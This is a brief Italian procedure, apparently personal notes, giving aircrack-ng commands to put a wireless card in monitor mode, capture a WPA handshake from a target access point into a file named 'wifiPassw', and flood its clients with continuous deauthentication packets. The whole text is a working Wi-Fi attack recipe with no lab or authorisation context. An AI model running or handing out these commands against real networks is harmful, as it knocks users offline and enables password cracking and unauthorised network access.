PROCEDURA:


sudo airmon-ng check kill -> per killare il networkmanager

sudo airmon-ng start wlan0 -> per startare in monitor mode il dongle

sudo airodump-ng -w wifiPassw -c 10 --bssid [MAC del'access point] wlan0 -> per catturare i pacchetti e l'handshake


mentre lanci questo deautentica i dispositivi con:
sudo aireplay-ng --deauth 0 -a [MAC del'access point] wlan0



